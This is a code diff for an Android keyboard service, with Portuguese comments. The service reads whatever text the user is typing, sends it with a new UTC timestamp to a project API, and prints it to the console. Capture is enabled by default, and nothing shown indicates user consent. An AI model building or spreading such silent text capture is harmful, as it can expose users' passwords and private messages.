@@ -4,6 +4,11 @@ import android.view.inputmethod.ExtractedText;
 import android.view.inputmethod.ExtractedTextRequest;
 import android.view.inputmethod.InputConnection;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.TimeZone;
+
 public class SubmitTextApiService {
     private final int ONE_SECOND = 1000;
     private final int QTD_MIN_PALAVRAS = 2;
@@ -14,6 +19,15 @@ public class SubmitTextApiService {
     // Variavel para controlar se o envio de textos esta habilitado
     // Por padrao vai vim habilitado.
     private boolean isCaptureEnabled = true;
+
+    // Formato para exibir o timestamp (ISO 8601)
+    private static final SimpleDateFormat ISO_8601_FORMAT = createISOFormatter();
+
+    private static SimpleDateFormat createISOFormatter () {
+        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
+        formatter.setTimeZone(TimeZone.getTimeZone("UTC")); // Garante que o timestamp seja UTC
+        return formatter;
+    }
 
     public SubmitTextApiService(){
         this.projectAPIService = new ProjectAPIService();
@@ -26,19 +40,28 @@ public class SubmitTextApiService {
     }
 
     private String getTypedText(InputConnection ic){
+        if (ic == null) {
+            return null;
+        }
+
         ExtractedText extractedText = ic.getExtractedText(new ExtractedTextRequest(), 0);
-        if(extractedText == null) {
+        if(extractedText == null || extractedText.text == null) {
             return null;
         }
         CharSequence text = extractedText.text;
         return text.toString();
     }
 
-    private void submitToApi(String text){
-        projectAPIService.submit(text);
+    private String getCurrentTimestampISO() {
+        return ISO_8601_FORMAT.format(new Date());
     }
 
-    private boolean verifyThreeWords(String text){
+    private void submitToApi(String text, String timestampISO){
+        projectAPIService.submit(text, timestampISO);
+        System.out.println("Text and timestamp submitted to the API: Text='" + text + "', TimestampISO='" + timestampISO + "'");
+    }
+
+    private boolean verifyMinimumWords(String text){
         return text.split(" ").length >= QTD_MIN_PALAVRAS;
     }
 
@@ -52,9 +75,10 @@ public class SubmitTextApiService {
         long currentTimeMillis = System.currentTimeMillis();
         if((currentTimeMillis - lastTimeMillis) > ONE_SECOND) {
             String text = getTypedText(ic);
-            if(text != null && verifyThreeWords(text)){
+            if(text != null && verifyMinimumWords(text)){
+                String timestampISO = getCurrentTimestampISO();
                 System.out.println("======================= submit =======================");
-                submitToApi(text);
+                submitToApi(text, timestampISO);
             }
         }
         lastTimeMillis = currentTimeMillis;
